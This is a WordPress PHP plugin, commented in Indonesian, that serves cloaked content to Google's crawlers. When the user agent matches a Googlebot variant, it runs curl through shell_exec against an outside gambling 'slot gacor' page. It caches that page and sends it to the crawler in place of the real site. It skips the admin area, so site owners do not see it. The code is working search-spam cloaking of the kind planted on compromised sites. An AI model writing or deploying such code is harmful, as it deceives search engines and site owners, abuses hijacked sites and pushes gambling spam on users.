<?php
/**
 * Plugin Name: Cloaking Helper
 * Description: Cloaking untuk Googlebot menggunakan shell_exec
 */

// Cegah akses langsung
if (!defined('ABSPATH')) {
    exit;
}

class CloakingHelper {
    
    // Cek apakah user agent adalah Googlebot
    public static function is_googlebot() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        $google_bots = [
            'Googlebot',
            'Googlebot-News', 
            'Googlebot-Image',
            'Googlebot-Video',
            'Googlebot-Mobile',
            'Google-Site-Verification',
            'Mediapartners-Google',
            'AdsBot-Google',
            'APIs-Google',
            'Google-InspectionTool'
        ];
        
        foreach ($google_bots as $bot) {
            if (stripos($user_agent, $bot) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    // Ambil konten menggunakan shell_exec dengan curl
    public static function fetch_content_with_curl($url) {
        // Escape URL untuk keamanan
        $escaped_url = escapeshellarg($url);
        
        // Command curl dengan user agent Googlebot
        $cmd = 'curl -s -L --max-time 30 \
            --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)" \
            --compressed \
            -H "Accept: text/html,application/xhtml+xml" \
            -H "Accept-Language: en-US,en;q=0.9" \
            ' . $escaped_url;
        
        $result = shell_exec($cmd);
        
        if (!empty($result) && strlen($result) > 100) {
            return $result;
        }
        
        return false;
    }
    
    // Ambil konten dengan cache
    public static function get_cached_content($url, $cache_hours = 6) {
        $cache_key = 'cloak_content_' . md5($url);
        $cached = get_transient($cache_key);
        
        if (false === $cached) {
            $content = self::fetch_content_with_curl($url);
            if ($content) {
                set_transient($cache_key, $content, $cache_hours * HOUR_IN_SECONDS);
                return $content;
            }
            return false;
        }
        
        return $cached;
    }
    
    // Proses konten untuk Googlebot
    public static function serve_cloaked_content() {
        if (!self::is_googlebot() || is_admin()) {
            return;
        }
        
        $target_url = 'https://bloomtalks.com/chia-cundinamarca/slot-gacor.html';
        $content = self::get_cached_content($target_url);
        
        if ($content) {
            // Bersihkan semua output buffer
            while (ob_get_level()) {
                ob_end_clean();
            }
            
            // Set header yang tepat
            header('Content-Type: text/html; charset=UTF-8');
            header('X-Robots-Tag: noindex, follow', true);
            header('X-Cloaking: active', true);
            
            // Tampilkan konten
            echo $content;
            exit;
        }
    }
}

// Hook ke template redirect (paling awal)
add_action('template_redirect', ['CloakingHelper', 'serve_cloaked_content'], 0);

// Untuk admin area, jangan lakukan cloaking
add_action('admin_init', function() {
    remove_action('template_redirect', ['CloakingHelper', 'serve_cloaked_content'], 0);
});
